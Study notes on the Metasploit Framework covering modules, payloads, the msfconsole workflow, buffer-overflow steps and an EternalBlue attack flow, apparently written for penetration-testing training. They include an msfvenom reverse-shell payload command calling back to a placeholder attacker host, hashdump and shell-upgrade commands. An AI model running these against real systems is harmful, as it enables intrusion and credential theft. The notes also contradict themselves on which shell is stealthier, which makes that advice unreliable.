# Metasploit Framework - Comprehensive Study Notes

# Introduction to Metasploit

The **Metasploit Framework** is a powerful penetration testing platform used for:

- Information Gathering
- Vulnerability Scanning
- Exploitation
- Post-Exploitation
- Exploit Development
- Payload Generation
- Vulnerability Research

---

# Metasploit Versions

## 1. Metasploit Framework (Open Source)

- Free and open-source.
- Command Line Interface (CLI) based.
- Widely used by penetration testers and security researchers.

## 2. Metasploit Pro (Commercial)

- Commercial edition.
- Provides a Graphical User Interface (GUI).
- Automates many penetration testing tasks.

---

# Main Components of Metasploit

| Component | Purpose |
|-----------|---------|
| **msfconsole** | Primary command-line interface |
| **Exploits** | Take advantage of vulnerabilities |
| **Payloads** | Code executed on the target |
| **Auxiliary Modules** | Scanning, fuzzing, enumeration |
| **Post Modules** | Actions performed after exploitation |
| **Encoders** | Modify payload signatures |
| **Evasion Modules** | Attempt to bypass security solutions |
| **NOPs** | Assist payload alignment |
| **Tools** | Standalone utilities like msfvenom |

---

# Core Concepts

## Vulnerability

A weakness in software or configuration.

**Analogy:** An open window in a house.

---

## Exploit

Code that abuses a vulnerability.

**Analogy:** A ladder used to reach the window.

---

## Payload

Code executed after successful exploitation.

Examples:

- Reverse shell
- Meterpreter
- Command shell

---

# Metasploit Architecture

## Exploits

Used to leverage vulnerabilities.

Example:

```text
exploit/windows/smb/ms17_010_eternalblue
```

---

## Auxiliary Modules

Used for:

- Port scanning
- Enumeration
- Banner grabbing
- Fuzzing

Example:

```text
auxiliary/scanner/smb/smb_version
```

---

## Payloads

Determine what happens after exploitation.

### Single Payloads

Format:

```text
shell_reverse_tcp
```

Characteristics:

- Entire payload sent at once.
- Reliable on unstable networks.
- Larger size.

---

### Staged Payloads

Format:

```text
shell/reverse_tcp
```

Characteristics:

- Small stager sent first.
- Downloads full payload later.
- Smaller initial size.

---

## Encoders

Modify payload appearance to evade signature-based detection.

---

## Evasion Modules

Attempt to bypass modern defensive mechanisms.

---

## NOPs

NOP = No Operation.

Common instruction:

```text
0x90
```

Used in:

- Memory alignment
- NOP sleds

---

## Post Modules

Used after successful exploitation.

Examples:

- Hash dumping
- Privilege escalation
- Persistence
- Pivoting

---

# Important Tools

## msfconsole

Central interface for interacting with Metasploit.

Features:

- Linux command support
- Tab completion
- Context-based workflow

Start Metasploit:

```bash
msfconsole
```

---

## msfvenom

Used for generating:

- Shellcode
- Executables
- Custom payloads

Example:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
```

---

## Pattern Create & Pattern Offset

Useful in Buffer Overflow exploit development.

### Pattern Create

Generates a unique string.

```bash
msf-pattern_create -l 1000
```

Purpose:

- Identify exact crash location.

---

### Pattern Offset

Determines exact offset.

```bash
msf-pattern_offset -q 4A31
```

---

# Buffer Overflow Workflow

1. Fuzz application.
2. Generate pattern.
3. Crash application.
4. Identify EIP offset.
5. Overwrite EIP.
6. Execute payload.

---

# Unsafe Functions

## gets()

- Does not perform boundary checking.
- Can cause buffer overflows.

Secure Alternative:

```c
fgets()
```

---

## strcpy()

- Copies strings without size validation.
- Can corrupt memory.

Secure Alternative:

```c
strncpy()
```

---

# Common Buffer Overflow Injection Points

## GUI Applications

- Username fields
- Password fields
- Search boxes
- File name fields

## Network Services

- FTP
- HTTP
- SMTP

## Command-Line Arguments

```bash
./vulnerable_program AAAAAAAA
```

## File Parsers

Examples:

- PDF
- MP3
- DOC

## Environment Variables

Examples:

```bash
PATH
HOME
```

---

# Post Exploitation

Actions performed after obtaining access.

## Objectives

### Privilege Escalation

Become Administrator or root.

### Data Collection

Gather:

- Passwords
- Sensitive files
- Database information

### Persistence

Maintain long-term access.

Examples:

- Backdoors
- User accounts

### Lateral Movement

Move between systems.

### Information Gathering

Collect:

- OS details
- Installed software
- Running services

---

# msfconsole Workflow

## Search Module

```bash
search ms17-010
```

## Use Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Show Options

```bash
show options
```

## Show Payloads

```bash
show payloads
```

## Module Information

```bash
info
```

## Return Back

```bash
back
```

---

# Exploit Workflow

1. Search
2. Use
3. Configure
4. Verify Options
5. Exploit

---

# Common Parameters

| Parameter | Meaning |
|------------|---------|
| RHOSTS | Target IP |
| RPORT | Target Port |
| LHOST | Attacker IP |
| LPORT | Listening Port |

---

# Global vs Local Variables

## Local

```bash
set RHOSTS 10.10.10.10
```

Applies only to current module.

## Global

```bash
setg RHOSTS 10.10.10.10
```

Applies throughout the session.

Reset:

```bash
unset all
```

---

# Important Prompts

| Prompt | Meaning |
|---------|---------|
| root@kali | Linux shell |
| msf6 > | Metasploit main menu |
| msf6 exploit(...) > | Exploit context |
| meterpreter > | Meterpreter session |
| C:\Windows\system32> | Standard shell |

---

# Sessions Management

Background session:

```bash
background
```

List sessions:

```bash
sessions
```

Interact:

```bash
sessions -i 2
```

Run exploit in background:

```bash
exploit -z
```

---

# Meterpreter vs Standard Shell

| Feature | Meterpreter | Standard Shell |
|----------|------------|----------------|
| Runs in Memory | Yes | No |
| Stealth | High | Low |
| Screenshot | Yes | No |
| Keylogging | Yes | No |
| Hashdump | Yes | No |
| AV Detection | Difficult | Easier |
| Native Commands | No | Yes |

---

# Useful Meterpreter Commands

```bash
getuid
sysinfo
hashdump
screenshot
shell
background
migrate -N explorer.exe
```

---

# Upgrading Shell to Meterpreter

```bash
background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST ATTACKER-IP
run
```

---

# EternalBlue Attack Flow

1. Verify vulnerability.
2. Set target information.
3. Run exploit.
4. Obtain shell.
5. Upgrade to Meterpreter.
6. Migrate to stable process.
7. Perform post-exploitation.

---

# Stability Best Practices

## Process Migration

```bash
migrate -N explorer.exe
```

---

## Prevent Session Storm

```bash
set ExitOnSession true
```

---

## Always Verify LHOST

Ensure VPN IP is correct.

---

## Reboot Unstable Targets

Reboot if repeated failures occur.

---

# Troubleshooting

## Connection Timeout Causes

### Memory Fragmentation

Target memory becomes unstable.

### Race Condition Failure

Exploit timing fails.

### Process Crash

Injected process terminates.

---

# Best Practices

- Always run `show options` before exploitation.
- Use `check` when available.
- Prefer Meterpreter for post-exploitation.
- Use standard shells when stealth is required.
- Migrate immediately after exploitation.
- Keep track of active sessions.

---

# Quick Reference Commands

```bash
search
use
show options
show payloads
info
set
setg
check
exploit
background
sessions
getuid
sysinfo
hashdump
screenshot
```
